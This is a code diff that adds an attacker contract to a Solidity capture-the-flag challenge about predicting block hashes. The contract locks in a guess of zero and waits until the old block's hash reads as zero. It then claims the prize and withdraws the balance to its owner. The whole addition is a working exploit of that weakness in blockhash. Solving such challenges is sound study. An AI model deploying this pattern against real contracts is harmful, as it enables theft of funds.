@@ -34,3 +34,36 @@ contract PredictTheBlockHashChallenge {
         }
     }
 }
+
+contract PredictTheBlockHashChallengeAttacker {
+
+    PredictTheBlockHashChallenge target;
+    address owner;
+    uint256 lockBlockNumber;
+
+    function PredictTheBlockHashChallengeAttacker(address _target) public payable {
+        require(msg.value == 1 ether);
+
+        owner = msg.sender;
+        target = PredictTheBlockHashChallenge(_target);
+        lockBlockNumber = block.number + 1;
+
+        target.lockInGuess.value(1 ether)(bytes32(0));
+    }
+
+    function tryAttack() public {
+        bytes32 answer = block.blockhash(lockBlockNumber);
+        require(answer == bytes32(0));
+
+        target.settle();
+
+        require(target.isComplete());
+    }
+
+    function withdraw() public {
+        require(owner == msg.sender);
+        owner.transfer(address(this).balance);
+    }
+
+    function() public payable {}
+}
